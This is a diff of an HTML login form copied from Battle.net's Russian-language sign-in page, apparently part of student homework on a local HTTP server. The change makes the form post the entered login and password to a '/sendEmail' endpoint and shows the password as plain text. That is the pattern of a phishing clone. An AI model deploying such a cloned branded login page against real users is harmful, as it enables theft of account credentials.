@@ -51,17 +51,17 @@
         <div class="other_authorization_options">
             <span>или войти через</span>
         </div>
-        <form>
+        <form action="/sendEmail" method="post">
             <div class="login_input">
                 <div class="mail_phone">
-                    <input class="inpt_1" placeholder="Электронная почта или телефон" />
+                    <input class="inpt_1" placeholder="Электронная почта или телефон" name="login" type="text" />
                 </div>
                 <div class="password">
-                    <input placeholder="Пароль" />
+                    <input placeholder="Пароль" name="password" type="text"/>
                     <img src="/Users/davidvasilev/Desktop/ORIS_D.V/Homework_3/HTTP_Server/HTTP_Server/bin/Debug/net7.0/static/BattleNet/images/eye.png" class="eye" />
                 </div> 
             </div>
-            <button class="log_in">Авторизоваться</button>
+            <button id ="btn_log_in" type="submit" class="log_in">Авторизоваться</button>
         </form>
         <a class="a_1" href="https://account.battle.net/creation/?ref=https%3A%2F%2Feu.shop.battle.net%2Fru-ru%2Ffamily%2Fworld-of-warcraft&theme=bnet-next&app=shop&hostingApp=shop&flowTrackingId=f60946e3-05fd-41fa-b288-a68eeee2dd4a&bdp=12b85b4363672c5d26c5b464f58d6700d75802fa840a3835195105b607287574">Зарегистрируйте учетную запись Battle.net бесплатно</a>
         <a class="a_2" href="https://account.battle.net/recovery/?ref=&theme=bnet-next&app=shop&hostingApp=shop&flowTrackingId=f60946e3-05fd-41fa-b288-a68eeee2dd4a">Вы не можете войти?</a>
